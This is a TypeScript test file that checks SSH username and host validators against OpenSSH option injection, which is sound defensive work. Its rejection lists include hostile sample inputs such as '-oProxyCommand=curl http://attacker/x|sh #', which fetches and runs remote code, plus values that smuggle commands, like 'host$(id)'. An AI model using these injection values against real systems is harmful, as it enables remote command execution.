/**
 * buildSSHArgs passes `${username}@${host}` as a bare positional argv element.
 * spawn() uses an argv array so no shell is involved, but OpenSSH still parses
 * a leading "-" as an option, and `-oProxyCommand=...` executes its value via
 * /bin/sh. These validators are the boundary that stops that.
 */
import { describe, expect, it } from "vitest";
import { isSafeSshHost, isSafeSshUsername } from "../ssh-tunnel";

describe("isSafeSshUsername", () => {
  it("rejects option-shaped usernames", () => {
    for (const username of [
      "-oProxyCommand=curl http://attacker/x|sh #",
      "-oProxyCommand=id",
      "-i/tmp/key",
      "-v",
      "--",
      "-",
    ]) {
      expect(isSafeSshUsername(username), username).toBe(false);
    }
  });

  it("rejects usernames containing separators or whitespace", () => {
    for (const username of ["a b", "a\tb", "a\nb", "a/b", "a:b", "a$b", "a`b", "a;b"]) {
      expect(isSafeSshUsername(username), username).toBe(false);
    }
  });

  it("accepts ordinary login names", () => {
    for (const username of ["ubuntu", "ec2-user", "deploy_bot", "first.last", "user@corp"]) {
      expect(isSafeSshUsername(username), username).toBe(true);
    }
  });
});

describe("isSafeSshHost", () => {
  it("rejects option-shaped and malformed hosts", () => {
    for (const host of ["-oProxyCommand=id", "-v", "host name", "host;id", "host$(id)", ""]) {
      expect(isSafeSshHost(host), host).toBe(false);
    }
  });

  it("accepts hostnames and IP literals", () => {
    for (const host of [
      "example.com",
      "build-01.internal.example.com",
      "10.0.0.5",
      "::1",
      "[2001:db8::1]",
      "localhost",
    ]) {
      expect(isSafeSshHost(host), host).toBe(true);
    }
  });
});
